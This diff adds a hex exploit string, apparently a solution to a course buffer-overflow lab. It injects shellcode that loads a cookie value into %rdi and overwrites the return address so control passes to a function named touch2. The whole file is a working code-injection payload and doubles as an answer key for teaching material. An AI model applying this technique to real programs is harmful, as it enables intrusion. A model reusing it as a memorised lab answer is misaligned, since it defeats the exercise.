@@ -1,0 +1,8 @@
+00 00 00 00 00 00 00 00     /* start of buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 c7 c7 fa 97 b9 59        /* mov $0x59b997fa,%rdi  argument for function <touch2>, which is the key */
+c3                          /* ret   these two lines and be combined, won't make any difference */
+00 00 00 00 00 00 00 00     /* end of buffer */
+90 dc 61 55 00 00 00 00    /* address of first command above */
+ec 17 40 00 00 00 00 00    /* address of function <touch2> */
